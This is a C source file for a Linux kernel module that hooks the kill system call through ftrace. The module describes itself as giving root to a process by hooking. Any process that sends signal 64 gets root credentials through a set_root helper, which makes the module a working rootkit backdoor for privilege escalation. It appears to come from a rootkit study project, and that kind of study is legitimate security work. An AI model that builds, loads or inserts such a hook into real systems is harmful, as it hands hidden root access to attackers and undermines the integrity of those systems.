/**
 * Hook sys_kill to handle set_root
 * 
 * @author Yekuuun
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "../lib/hook/ftrace_helper.h"
#include "../lib/creds/creds.h"

#define MODNAME "SET_ROOT"

MODULE_AUTHOR("Yekuuun");
MODULE_DESCRIPTION("Giving root privileges to a process using hooking.");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.0.1");


#ifdef PTREGS_SYSCALL_STUBS

static asmlinkage long(*orig_kill)(const struct pt_regs *regs);

static asmlinkage int hook_kill(const struct pt_regs *regs){

    int pid = regs->di;
    int sig = regs->si;

    if(sig == 64){
        pr_info("[*] Try giving root to current process\n");
        int ret = set_root();

        if(ret != 0){
            pr_err("[!] Error setting root for current process\n");
            return ret;
        }

        pr_info("[*] root granted\n");
        return 0;
    }

    return orig_kill(regs);
}

#else

static asmlinkage long(*orig_kill)(pid_t pid, int sig);

static asmlinkage int hook_kill(pid_t pid, int sig){

    if(sig == 64){
        pr_info("[*] Try giving root to current process\n");
        int ret = set_root();

        if(ret != 0){
            pr_err("[!] Error setting root for current process\n");
            return ret;
        }

        pr_info("[*] root granted\n");
        return 0;
    }

    return orig_kill(pid, sig);
}

#endif

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill)
};


static int __init root_lkm_init(void){
    int err;

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        pr_err("[%s] Failed to install hooks: %d\n", MODNAME, err);
        return err;
    }

    pr_info("[%s] Module loaded, hooks installed.\n", MODNAME);
    return 0;
}

static void __exit root_lkm_exit(void){
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    pr_info("[*s] Module unloaded, hooks removed.\n", MODNAME);
}

module_init(root_lkm_init);
module_exit(root_lkm_exit);